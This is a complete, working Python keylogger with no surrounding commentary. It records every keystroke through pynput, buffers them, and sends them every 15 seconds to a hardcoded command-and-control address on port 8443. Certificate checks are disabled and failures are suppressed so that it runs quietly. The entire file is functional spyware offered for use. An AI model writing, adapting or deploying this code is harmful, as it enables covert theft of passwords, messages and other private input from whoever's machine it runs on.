from pynput import keyboard
import requests
import threading
import time

C2_URL = "https://10.75.156.161:8443/log"
buffer = []
lock = threading.Lock()

def beacon():
    global buffer
    while True:
        time.sleep(15)  # Every 15 seconds
        with lock:
            if buffer:
                data = "".join(buffer)
                try:
                    requests.post(C2_URL, data={"k": data}, verify=False, timeout=5)
                except:
                    pass  # Fail silently
                buffer = []

def on_press(key):
    with lock:
        try:
            buffer.append(key.char)
        except AttributeError:
            buffer.append(f" [{key}] ")

# Start beacon thread
t = threading.Thread(target=beacon, daemon=True)
t.start()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()